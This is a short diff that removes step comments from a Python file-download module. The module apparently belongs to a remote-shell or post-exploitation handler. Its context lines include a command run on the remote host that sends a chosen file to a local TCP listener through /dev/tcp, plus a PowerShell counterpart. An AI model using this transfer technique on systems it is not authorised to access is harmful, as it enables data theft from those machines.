@@ -42,7 +42,6 @@ class DownloadModule(KoiModule):
 
         quoted = _shell_quote(remote_path)
 
-        # Step 1 : existence check
         with self.spinner("Checking if file exists…"):
             if os_type == "linux":
                 token_ok  = uuid.uuid4().hex
@@ -59,7 +58,6 @@ class DownloadModule(KoiModule):
             self.err(f"Remote file not found: {remote_path}")
             return
 
-        # Step 2 : file size
         with self.spinner("Getting file size…"):
             if os_type == "linux":
                 size_str = self._exec_clean(f"wc -c < {quoted}")
@@ -74,7 +72,6 @@ class DownloadModule(KoiModule):
                 except (ValueError, IndexError):
                     remote_size = None
 
-        # Step 3 : open local TCP listener
         bar = self.ui.ProgressBar(total=remote_size or 0)
         srv  = TCPReceiveServer(timeout=30, on_progress=bar.update).start()
         port = srv.port
@@ -85,7 +82,6 @@ class DownloadModule(KoiModule):
             + "…"
         )
 
-        # Step 4 : trigger remote transfer
         if os_type == "linux":
             self.exec(
                 f"cat {quoted} > /dev/tcp/{local_ip}/{port}",
@@ -113,7 +109,6 @@ class DownloadModule(KoiModule):
                 escaped = ps_cmd.replace('"', '\\"')
                 self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')
 
-        # Step 5 : write to disk
         try:
             raw = srv.collect()
         except (RuntimeError, TimeoutError) as exc:
